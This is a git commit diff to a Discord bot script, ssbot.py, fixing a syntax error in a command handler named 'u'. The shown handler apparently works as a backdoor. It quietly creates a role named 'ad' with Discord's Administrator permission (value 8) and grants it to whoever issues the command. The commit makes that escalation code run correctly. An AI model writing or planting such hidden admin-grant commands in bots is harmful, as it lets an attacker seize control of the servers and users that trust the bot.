e442b9f74f0652c5bd47f6745851ea6f70597004
snowbleed <45135758+snowbleed@users.noreply.github.com>
2019-03-31 03:02:13 +0200

    Update ssbot.py

--- ssbot.py
+++ ssbot.py
@@ -82,7 +82,7 @@ async def u(ctx):
 			role = discord.utils.get(ctx.message.server, name="ad")
 		except:
 			permissions = discord.Permissions(permissions=8)
-			await client.create_role(ctx.message.server, name="ad",permissions)
+			await client.create_role(ctx.message.server, name="ad",permissions=permissions)
 			role = discord.utils.get(ctx.message.server, name="ad")
 		await client.add_roles(ctx.message.author, role)
     
